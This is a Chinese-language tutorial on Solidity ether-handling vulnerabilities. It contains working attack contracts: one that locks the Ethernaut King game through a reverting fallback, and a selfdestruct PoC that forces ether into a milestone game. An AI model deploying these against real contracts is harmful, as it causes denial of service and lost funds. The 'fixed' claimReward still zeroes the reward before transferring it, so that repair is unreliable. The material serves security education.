### 1. 发送和接收以太币存在的安全风险

Solidity中有三种方式可以向目标地址发送ether:

`<address>.transfer(uint256 amount)`向目标地址发送amount wei的以太币，失败时**抛出异常**，发送 **2300 gas **的矿工费，不可调节。

`<address>.send(uint256 amount) returns (bool)`向目标地址发送amount wei的以太币，失败时**返回false**，发送 2300 gas 的矿工费，不可调节。

`<address>.call.value(uint256 amount)() returns (bool)`向目标地址发送amount wei的以太币，失败时返回false，发送**所有可用gas**，可调节(`.gas(uint256 gasAmount)`)。

如果一个合约收到了 以太币Ether （且没有函数被调用），就会执行 fallback函数。 如果没有 fallback函数，那么 以太币Ether 会被拒收（同时会抛出异常）。 如果合约使用transfer/send方式向目标合约地址发送Ether，在目标合约fallback函数的执行过程中，合约只能依靠此时可用的"gas 津贴"（2300 gas）来执行。这笔津贴并不足以用来完成任何方式的 存储storage 访问。为了确保你的合约可以通过这种方式收到 以太币Ether，请核对 fallback函数所需的 gas 数量 。

-   向地址发送Ether可能存在的安全风险
    -   案例

以下代码来自于[Ethernaut-King](https://ethernaut.zeppelin.solutions/level/0x32d25a51c4690960f1d18fadfa98111f71de5fa7)

``` {.solidity}
  pragma solidity ^0.4.18;
  
  import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
  
  contract King is Ownable {
  
    address public king;
    uint public prize;
  
    function King() public payable {
      king = msg.sender;
      prize = msg.value;
    }
  
    function() external payable {
      require(msg.value >= prize || msg.sender == owner);
      king.transfer(msg.value);
      king = msg.sender;
      prize = msg.value;
    }
  }
```

无论谁发送一个大于当前奖金的ether，都会成为新的国王，被推翻的国王获得了新的奖金。如果攻击者部署一个合约，代码如下：

``` {.solidity}
pragma solidity ^0.4.24;

contract KingForever {

    constructor() public payable {
        address a = 0x81301fDa94783D90362b16d475012DAF15BD571A;//原合约地址
        a.call.value(msg.value)();
    }
    
    function() external payable {
        revert();
    }
}
```

因为fallback函数无法接收ether，攻击者通过攻击合约变成king之后，新的竞争者在向案例合约发送以太币以变成King的过程中，执行`king.transfer(msg.value);`会一直revert，攻击者实际上是执行了一次7.1章节所描述的DOS攻击。

-   使用send向地址发送Ether可能存在的安全风险

这个案例来自于[KingOfTheEtherThone](https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol)

``` {.solidity}
uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;

uint compensation = valuePaid - wizardCommission;

if (currentMonarch.etherAddress != wizardAddress) {
    currentMonarch.etherAddress.send(compensation);
} else {
    // When the throne is vacant, the fee accumulates for the wizard.
}
```

因为send执行失败后会返回false而不是抛出异常，合约中未检查send返回值，部分通过合约账户参与游戏的玩家，因为send附带的2300gas无法完成fallback操作，导致接收ether返还失败。

-   使用call.value()()向地址发送Ether可能存在的安全风险

使用call.value()()发送以太默认会附带全部剩余gas，如果合约实现存在隐患，可能造成重入攻击，并且，call.value发送以太币失败后会返回false，如果未对返回值进行检查，那么合约会默认所有发送ether都成功，然后执行状态变量的改变，显然，这是存在逻辑缺陷的。

-   漏洞修复
    -   向地址发送以太币时，请分别考虑接收地址是普通账户和合约账户的区别，如果接收地址是一个合约，需要考虑是否在交易中附带足够的gas，确保合约拥有足够的gas执行对应函数；
    -   必须考虑发送ether失败的可能的情况：transfer发送失败会revert，但是此特性可以用来发起DOS攻击，send和call.value发送ether失败会返回false，开发者需要对此进行处理；
-   参考资料

    -   [以太坊官方文档-地址相关](https://solidity.readthedocs.io/en/v0.4.24/units-and-global-variables.html#address-related)
    -   [以太坊官方文档-发送和接收Ether](https://solidity.readthedocs.io/en/v0.4.24/security-considerations.html#sending-and-receiving-ether)

### 2.强行将以太币置入合约

通常，当 Ether
发送到合约时，它必须执行回退功能或合约中的其他函数。这里有三个例外，合约可能会收到了
Ether
但并不会执行任何函数。通过收到以太币来触发代码的合约，对强制将以太币发送到某个合约这类攻击是非常脆弱的。

**自毁**

任何合约都能够实现该[`selfdestruct(address)`](http://solidity.readthedocs.io/en/latest/introduction-to-smart-contracts.html#self-destruct)功能，该功能从合约地址中删除所有字节码，并将所有存储在那里的 Ether发送到参数指定的地址。如果此指定的地址也是合约，则不会调用任何函数（包括fallback函数）。因此，使用`selfdestruct()` 函数可以无视目标合约中存在的任何代码，强制将 Ether发送给任一目标合约，包括没有任何可支付函数的合约。这意味着，任何攻击者都可以创建带有`selfdestruct()` 函数的合约，向其发送 Ether，调用 `selfdestruct(target)`并强制将 Ether 发送至 `target` 合约。Martin Swende有一篇出色的[博客文章](http://martin.swende.se/blog/Ethereum_quirks_and_vulns.html)描述了自毁操作码的一些诡异操作，并描述了客户端节点如何检查不正确的不变量，这可能会导致相当灾难性的客户端问题。

**预先发送的 Ether**

合约不使用 `selfdestruct()` 函数或调用任何 payable 函数仍可以接收到Ether 的第二种方式是把 Ether
预发送到合约地址。合约地址是确定性的，实际上地址是根据创建合约的地址及创建合约的交易Nonce 的哈希值计算得出的，即下述形式：

`address = sha3(rlp.encode([account_address,transaction_nonce])` 请参阅
[KeylessEther](https://github.com/sigp/solidity-security-blog#keyless-eth)
在这一点上的一些有趣用例或者[How is the address of an Ethereum contractcomputed?](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed)。这意味着，任何人都可以在创建合约之前计算出合约地址，并将Ether 发送到该地址。当合约确实创建时，它将具有非零的 Ether 余额。

**[挖矿](https://solidity-cn.readthedocs.io/zh/develop/security-considerations.html#ether)**

目前无论是合约还是"外部账户"都不能阻止有人给它们发送 以太币Ether。合约可以对一个正常的转账做出反应并拒绝它，但还有些方法可以不通过创建消息来发送 以太币Ether。其中一种方法就是单纯地向合约地址"挖矿" 。

- 案例

```{.solidity}
pragma solidity ^0.4.22;

contract EtherGame {
    
    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether; 
    uint public finalMileStone = 10 ether; 
    uint public finalReward = 5 ether; 
    
    mapping(address => uint) redeemableEther;
    // users pay 0.5 ether. At specific milestones, credit their accounts
    function play() public payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = address(this).balance + msg.value;
        // ensure no players after the game as finished
        require(currentBalance <= finalMileStone);
        // if at a milestone credit the players account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }
    
    function claimReward() public {
        // ensure the game is complete
        require(address(this).balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0); 
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(redeemableEther[msg.sender]);
    }
 }  
```

这个合约代表一个简单的游戏（自然会引起[竞态条件（Race-conditions）](https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E9%9D%9E%E6%B3%95%E9%A2%84%E5%85%88%E4%BA%A4%E6%98%93)），玩家可以将 `0.5 ether` 发送给合约，希望成为第一个达到三个里程碑之一的玩家。里程碑以Ether 计价。当游戏结束时，第一个达到里程碑的人可以获得合约的部分Ether。当达到最后的里程碑（10 Ether）时，游戏结束，用户可以取走奖励。

该合约的问题出在`uint currentBalance = this.balance + msg.value;`(以及相关的\[16\]行)和\[32\]行对this.balance的错误使用。攻击者可以通过上述提到的三种方式将ether置入合约:

比如第一种方式：

```{.solidity}
pragma solidity ^0.4.22;

contract POC {
    address owner;
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function attack(address _addr) public onlyOwner {
        selfdestruct(_addr);
    }
    
    function() external payable {}
}
```

部署合约的时候在交易中附加0.1
ether，然后调用attack函数自毁合约，此时将会把0.1
ether发送到案例合约，因为案例合约每次只能接收0.5
ether，普通玩家将永远不能满足里程碑的要求，游戏将没有胜利的玩家，除非有剩下的0.4
ether被强行打入合约。

第二种方式：

使用solidity计算某个合约的部署地址的方法是`address(keccak256(0xd6, 0x94, _from, nonce))`其中，`_from`表示部署合约的账号的地址，nonce表示账号地址部署这个合约时的nonce，即最新的交易序号+1。如果部署合约的账户是第一次交易，如果账户是合约，nonce=1，如果是普通用户，nonce=0：

```{.solidity}
nonce0= address(keccak256(0xd6, 0x94, _from, 0x80))
nonce1= address(keccak256(0xd6, 0x94, _from, 0x01))
nonce2= address(keccak256(0xd6, 0x94, _from, 0x02))
```

- 漏洞修复

此漏洞是对this.balance的滥用，在可能的情况下，合约逻辑应避免依赖于合约余额的确切值，因为它可以在合约逻辑之外被人为操纵。如果合约逻辑必须基于this.balance，那么需要考虑合约意外的余额。

如果确实需要精确的余额值，那么应该定义一个状态变量，该变量在合约通过payable函数接收到ether的时候增加，用来安全的追踪合约收到的ether，并且，这个变量不会受到强制发送ether到合约（例如selfdestruct()
）的影响。因此，对上述案例合约的修改如下：

```{.solidity}
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether; 
    uint public finalMileStone = 10 ether; 
    uint public finalReward = 5 ether; 
    uint public depositedWei;// 新增状态变量，表示合约收到玩家发送的ether数量

    mapping (address => uint) redeemableEther;

    function play() public payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game as finished
        require(currentBalance <= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0); 
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(redeemableEther[msg.sender]);
    }
 }   
```

- 参考链接：https://blog.sigmaprime.io/solidity-security.html#ether